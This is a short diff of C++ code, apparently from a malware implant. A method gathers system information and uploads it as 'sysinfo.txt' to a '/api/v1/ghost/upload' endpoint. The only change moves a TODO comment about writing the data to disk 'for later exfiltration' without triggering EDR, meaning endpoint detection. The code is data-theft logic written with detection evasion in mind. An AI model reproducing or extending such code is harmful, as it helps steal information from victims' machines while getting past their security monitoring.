@@ -10,8 +10,7 @@ bool SystemInfoMethod::trigger() {
 
     if (data.empty()) return false;
 
+    // TODO: possibly write to disk for later exfiltration? think through, cause it'll probably trigger EDR
     LOG_INFO("Uploading info")
     return Comms::UploadFile("/api/v1/ghost/upload", "sysinfo.txt", data);
-
-    // TODO: possibly write to disk for later exfiltration? think through, cause it'll probably trigger EDR
 }
